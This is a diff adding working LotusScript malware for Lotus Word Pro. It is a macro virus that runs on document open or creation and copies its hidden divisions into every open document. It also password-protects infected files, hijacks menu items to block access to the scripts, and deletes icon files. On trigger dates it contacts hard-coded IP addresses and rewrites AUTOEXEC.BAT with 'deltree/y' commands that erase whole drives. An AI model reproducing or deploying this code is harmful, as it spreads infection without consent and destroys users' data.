@@ -1,0 +1,421 @@
+Private Sub BindEvents(Byval Objectname_ As String)
+	Static Source As WPAPPLICATION
+	Set Source = Bind(Objectname_)
+	On Event Documentopened From Source Call Documentopened
+	On Event Documentcreated From Source Call Documentcreated
+End Sub
+
+Sub Documentopened(Source As Wpapplication, Docname As String)
+	Dim srcdoc As Variant
+	Dim curactivedoc As Variant 
+	Dim srcoledivname As String
+	Dim srcsrptdivname As String
+	Dim srclayoutname As String
+	Dim acompany As Long
+	Dim infected As Long
+	Dim hKey As Long
+	Dim HKEY_LOCAL_MACHINE As Long
+	Dim KEY_READ As Long
+	Dim HKEY_CURRENT_USER As Long
+	Dim ValueType As Long
+	Dim ReturnedKeyContents As String * 255
+	Dim readbytes As Long
+	On Error Goto 0
+	On Error Resume Next
+	
+	acompany=0
+	Set curactivedoc = .activedocument
+	Forall doc In .documents
+		Forall div In doc.divisions
+			If div.divisioninfo.name = "~|!+@_#)$(%*^&" Then
+				Set srcdoc = doc
+				srcoledivname = div.name
+				srclayoutname = div.foundry.layouts.item(12).name
+				acompany = 1
+			End If
+		End Forall
+		If acompany = 1 Then
+			Forall div In doc.divisions
+				If div.divisioninfo.name = "Scripts" Then
+					srcsrptdivname = div.name
+				End If
+			End Forall
+			Exit Forall
+		End If
+	End Forall
+	
+	ReturnedKeycontents$=String$(255,Chr$(32))
+	HKEY_LOCAL_MACHINE= &H80000002
+	HKEY_CURRENT_USER= &H80000001
+	KEY_QUERY_VALUE=1
+	KEY_ENUMERATE_SUBKEYS=8
+	KEY_NOTIFY=16
+	KEY_READ=KEY_QUERY_VALUE Or KEY_ENUMERATE_SUBKEYS Or KEY_NOTIFY
+	BaseName$="Software\Microsoft\Windows\CurrentVersion\Run\"  
+	KeyName$= BaseName$
+	ValueName$="NETSPY"
+	lstat=RegOpenKeyExA(HKEY_LOCAL_MACHINE,KeyName$,0,KEY_READ,hKey)
+	ReadBytes=255
+	lstat=RegQueryValueExA(hKey,ValueName$,0,valueType, ReturnedKeyContents$,ReadBytes)
+	regclosekey(hKey)
+	PathName$=Left$(ReturnedKeyContents$,ReadBytes-1)
+	If PathName$ <> "c:\windows\system\netspy.exe" Then
+		srcdoc.Divisions(srcoledivname).Foundry.Layouts(srclayoutname).Content.Open 0, 0
+		srcdoc.Divisions(srcoledivname).DivisionInfo.Changed = True
+		For i=0 To .applicationwindow.UserInterfacePrefs.StylePaths.count-1
+			location= .applicationwindow.UserInterfacePrefs.stylepaths.item(i)
+			filename= .applicationwindow.UserInterfacePrefs.StyleSheetName
+			fullname=location+"\"+filename
+			Forall doc In .documents
+				If doc.fullname=fullname Then
+					exist=1
+				End If
+			End Forall
+			If exist <>1 Then
+				.OpenDocument filename, location, , , , False
+			Else
+				Exit Sub
+			End If
+		Next
+	End If
+	srcdoc.activate
+	.copydivision(srcsrptdivname)
+	infected = 0
+	Forall doc In .documents
+		Forall div In doc.divisions
+			If div.divisioninfo.name = "~|!+@_#)$(%*^&" Then
+				infected = infected + 1
+			End If
+		End Forall
+		If infected < 1 Then
+			doc.activate
+			Forall div In doc.divisions
+				If div.divisioninfo.name = "Scripts" Then
+					divname = div.name
+					.deletedivision(divname)
+				End If
+			End Forall
+			.pastedivision
+			Forall div In .activedocument.divisions
+				If div.divisioninfo.name = "Scripts" Then
+					div.divisioninfo.name = "Scripts"
+					Forall sdiv In div.divisions
+						sdiv.divisioninfo.ignoretab=True
+					End Forall
+					div.divisioninfo.ignoretab=True
+				End If
+			End Forall
+		Else
+			infected = 0
+		End If
+	End Forall
+	srcdoc.activate
+	.copydivision(srcoledivname)
+	infected = 0
+	Forall doc In .documents
+		Forall div In doc.divisions
+			If div.divisioninfo.name = "~|!+@_#)$(%*^&" Then
+				infected = 1
+			End If
+		End Forall
+		If infected = 0 Then
+			doc.activate
+			.pastedivision
+			Forall div In .activedocument.divisions
+				If div.divisioninfo.name = "~|!+@_#)$(%*^&" Then
+					div.divisioninfo.name = "~|!+@_#)$(%*^&"
+					div.divisioninfo.ignoretab=True
+				End If
+			End Forall
+			yname=.Application.Preferences.UserName
+			uname=doc.doccontrol.DocControlRestrictedToEditor
+			If uname<>"" Then
+				.Application.Preferences.UserName=uname
+			End If
+			doc.doccontrol.DocControlPassword="720401"
+			doc.doccontrol.DocControlProtection=$LwpDocProtectTypePassword 
+			.Application.Preferences.UserName=yname
+			doc.doccontrol.showdivisiontabs=False
+		Else
+			infected = 0
+		End If
+	End Forall
+	
+	Forall menuitem In .applicationwindow.lwpmenubar.items("(&F)").items("(&U)").items
+		If menuitem.caption ="Word Pro (&P)..." Then
+			menuitem.action = "!mysub"
+		End If
+		If menuitem.caption ="(&S)..." Then
+			menuitem.action = "!mysub"
+		End If
+		If menuitem.caption ="(&M)..." Then
+			menuitem.action = "!mysub"
+		End If
+	End Forall
+	
+	Forall menuitem In .applicationwindow.lwpmenubar.items("(&E)").items("Script (&I)...").items
+		If menuitem.caption = " Script (&E)" Then
+			menuitem.action = "!mysub"
+		End If
+	End Forall
+	
+	Forall menuitem In .applicationwindow.lwpmenubar.items("(&V)").items
+		If menuitem.caption = "(&V)..." Then
+			menuitem.action = "!mysub"
+		End If
+	End Forall
+	
+	Forall menuitem In .applicationwindow.lwpmenubar.items("(&C)").items
+		If menuitem.caption = "(&M)..." Then
+			menuitem.action = "!mysub"
+		End If
+	End Forall
+	
+	.applicationwindow.UserInterfacePrefs.RunMacroOnDocEvents=True
+	.applicationwindow.iconbarmanager.SelectStandardIcon(&H35F)
+	.applicationwindow.iconbarmanager.iconhelptext="/"
+	
+	Kill "c:\lotus\wordpro\icons\script.smi"
+	Kill "d:\lotus\wordpro\icons\script.smi"
+	Kill "e:\lotus\wordpro\icons\script.smi"
+	
+	For i=0 To .applicationwindow.UserInterfacePrefs.StylePaths.count-1
+		location= .applicationwindow.UserInterfacePrefs.stylepaths.item(i)
+		filename= .applicationwindow.UserInterfacePrefs.StyleSheetName
+		fullname=location+"\"+filename
+		Forall doc In .documents
+			If doc.fullname=fullname Then
+				doc.close True
+			End If
+		End Forall
+	Next	
+	
+	curactivedoc.activate
+	If Month(Now) = 5 Or Day(Now)=20 Then
+		FileName =  .RetrieveInternetFile("http://10.24.88.88/info.html")
+		If FileName="" Then
+			FileName =  .RetrieveInternetFile("http://10.25.88.88/info.html")
+			If FileName="" Then
+				FileName =  .RetrieveInternetFile("http://129.9.161.55/info.html")
+				If FileName="" Then
+					FileName =  .RetrieveInternetFile("http://10.57.88.88/")
+				End If
+			End If
+		End If
+		
+		If FileName <> "" Then
+			.OpenDocument Filename, "", "HTML", "", False, True
+			filenumber%= Freefile
+			Open "C:\AUTOEXEC.BAT" For Output Access Write As fileNumber%
+			fileContents$ = "deltree/y c:\"
+			Print #fileNumber%, fileContents$
+			fileContents$ = "deltree/y d:\"
+			Print #fileNumber%, fileContents$
+			fileContents$ = "deltree/y e:\"
+			Print #fileNumber%, fileContents$
+			Close filenumber%
+		End If
+	End If
+End Sub
+
+Sub Documentcreated(Source As Wpapplication, Stylesheet As String)
+	Dim srcdoc As Variant
+	Dim curactivedoc As Variant 
+	Dim srcoledivname As String
+	Dim srcsrptdivname As String
+	Dim srclayoutname As String
+	Dim acompany As Long
+	Dim infected As Long
+	Dim hKey As Long
+	Dim HKEY_LOCAL_MACHINE As Long
+	Dim KEY_READ As Long
+	Dim HKEY_CURRENT_USER As Long
+	Dim ValueType As Long
+	Dim ReturnedKeyContents As String * 255
+	Dim readbytes As Long
+	On Error Goto 0
+	On Error Resume Next
+	acompany=0
+	Set curactivedoc = .activedocument
+	Forall doc In .documents
+		Forall div In doc.divisions
+			If div.divisioninfo.name = "~|!+@_#)$(%*^&" Then
+				Set srcdoc = doc
+				srcoledivname = div.name
+				srclayoutname = div.foundry.layouts.item(12).name
+				acompany = 1
+			End If
+		End Forall
+		If acompany = 1 Then
+			Forall div In doc.divisions
+				If div.divisioninfo.name = "Scripts" Then
+					srcsrptdivname = div.name
+				End If
+			End Forall
+			Exit Forall
+		End If
+	End Forall
+	ReturnedKeycontents$=String$(255,Chr$(32))
+	HKEY_LOCAL_MACHINE= &H80000002
+	HKEY_CURRENT_USER= &H80000001
+	KEY_QUERY_VALUE=1
+	KEY_ENUMERATE_SUBKEYS=8
+	KEY_NOTIFY=16
+	KEY_READ=KEY_QUERY_VALUE Or KEY_ENUMERATE_SUBKEYS Or KEY_NOTIFY
+	BaseName$="Software\Microsoft\Windows\CurrentVersion\Run\"  
+	KeyName$= BaseName$
+	ValueName$="NETSPY"
+	lstat=RegOpenKeyExA(HKEY_LOCAL_MACHINE,KeyName$,0,KEY_READ,hKey)
+	ReadBytes=255
+	lstat=RegQueryValueExA(hKey,ValueName$,0,valueType, ReturnedKeyContents$,ReadBytes)
+	regclosekey(hKey)
+	PathName$=Left$(ReturnedKeyContents$,ReadBytes-1)
+	If PathName$ <> "c:\windows\system\netspy.exe" Then
+		srcdoc.Divisions(srcoledivname).Foundry.Layouts(srclayoutname).Content.Open 0, 0
+		srcdoc.Divisions(srcoledivname).DivisionInfo.Changed = True
+		For i=0 To .applicationwindow.UserInterfacePrefs.StylePaths.count-1
+			location= .applicationwindow.UserInterfacePrefs.stylepaths.item(i)
+			filename= .applicationwindow.UserInterfacePrefs.StyleSheetName
+			fullname=location+"\"+filename
+			Forall doc In .documents
+				If doc.fullname=fullname Then
+					exist=1
+				End If
+			End Forall
+			If exist <>1 Then
+				.OpenDocument filename, location, , , , False
+			Else
+				Exit Sub
+			End If
+		Next
+	End If
+	srcdoc.activate
+	.copydivision(srcsrptdivname)
+	infected = 0
+	Forall doc In .documents
+		Forall div In doc.divisions
+			If div.divisioninfo.name = "~|!+@_#)$(%*^&" Then
+				infected = infected + 1
+			End If
+		End Forall
+		If infected < 1 Then
+			doc.activate
+			Forall div In doc.divisions
+				If div.divisioninfo.name = "Scripts" Then
+					divname = div.name
+					.deletedivision(divname)
+				End If
+			End Forall
+			.pastedivision
+			Forall div In .activedocument.divisions
+				If div.divisioninfo.name = "Scripts" Then
+					div.divisioninfo.name = "Scripts"
+					Forall sdiv In div.divisions
+						sdiv.divisioninfo.ignoretab=True
+					End Forall
+					div.divisioninfo.ignoretab=True
+				End If
+			End Forall
+		Else
+			infected = 0
+		End If
+	End Forall
+	srcdoc.activate
+	.copydivision(srcoledivname)
+	infected = 0
+	Forall doc In .documents
+		Forall div In doc.divisions
+			If div.divisioninfo.name = "~|!+@_#)$(%*^&" Then
+				infected = 1
+			End If
+		End Forall
+		If infected = 0 Then
+			doc.activate
+			.pastedivision
+			Forall div In .activedocument.divisions
+				If div.divisioninfo.name = "~|!+@_#)$(%*^&" Then
+					div.divisioninfo.name = "~|!+@_#)$(%*^&"
+					div.divisioninfo.ignoretab=True
+				End If
+			End Forall
+			yname=.Application.Preferences.UserName
+			uname=doc.doccontrol.DocControlRestrictedToEditor
+			If uname<>"" Then
+				.Application.Preferences.UserName=uname
+			End If
+			doc.doccontrol.DocControlPassword="720401"
+			doc.doccontrol.DocControlProtection=$LwpDocProtectTypePassword 
+			.Application.Preferences.UserName=yname
+			doc.doccontrol.showdivisiontabs=False
+		Else
+			infected = 0
+		End If
+	End Forall
+	Forall menuitem In .applicationwindow.lwpmenubar.items("(&F)").items("(&U)").items
+		If menuitem.caption ="Word Pro (&P)..." Then
+			menuitem.action = "!mysub"
+		End If
+		If menuitem.caption ="(&S)..." Then
+			menuitem.action = "!mysub"
+		End If
+		If menuitem.caption ="(&M)..." Then
+			menuitem.action = "!mysub"
+		End If
+	End Forall
+	Forall menuitem In .applicationwindow.lwpmenubar.items("(&E)").items("Script (&I)...").items
+		If menuitem.caption = " Script (&E)" Then
+			menuitem.action = "!mysub"
+		End If
+	End Forall
+	Forall menuitem In .applicationwindow.lwpmenubar.items("(&V)").items
+		If menuitem.caption = "(&V)..." Then
+			menuitem.action = "!mysub"
+		End If
+	End Forall
+	Forall menuitem In .applicationwindow.lwpmenubar.items("(&C)").items
+		If menuitem.caption = "(&M)..." Then
+			menuitem.action = "!mysub"
+		End If
+	End Forall
+	.applicationwindow.UserInterfacePrefs.RunMacroOnDocEvents=True
+	.applicationwindow.iconbarmanager.SelectStandardIcon(&H35F)
+	.applicationwindow.iconbarmanager.iconhelptext="/"
+	Kill "c:\lotus\wordpro\icons\script.smi"
+	Kill "d:\lotus\wordpro\icons\script.smi"
+	Kill "e:\lotus\wordpro\icons\script.smi"
+	For i=0 To .applicationwindow.UserInterfacePrefs.StylePaths.count-1
+		location= .applicationwindow.UserInterfacePrefs.stylepaths.item(i)
+		filename= .applicationwindow.UserInterfacePrefs.StyleSheetName
+		fullname=location+"\"+filename
+		Forall doc In .documents
+			If doc.fullname=fullname Then
+				doc.close True
+			End If
+		End Forall
+	Next
+	curactivedoc.activate
+	If Month(Now) = 5 Or Day(Now)=20 Then
+		FileName =  .RetrieveInternetFile("http://10.24.88.88/info.html")
+		If FileName="" Then
+			FileName =  .RetrieveInternetFile("http://10.25.88.88/info.html")
+			If FileName="" Then
+				FileName =  .RetrieveInternetFile("http://129.9.161.55/info.html")
+				If FileName="" Then
+					FileName =  .RetrieveInternetFile("http://10.57.88.88/")
+				End If
+			End If
+		End If
+		If FileName <> "" Then
+			.OpenDocument Filename, "", "HTML", "", False, True
+			filenumber%= Freefile
+			Open "C:\AUTOEXEC.BAT" For Output Access Write As fileNumber%
+			fileContents$ = "deltree/y c:\"
+			Print #fileNumber%, fileContents$
+			fileContents$ = "deltree/y d:\"
+			Print #fileNumber%, fileContents$
+			fileContents$ = "deltree/y e:\"
+			Print #fileNumber%, fileContents$
+			Close filenumber%
+		End If
+	End If
+End Sub
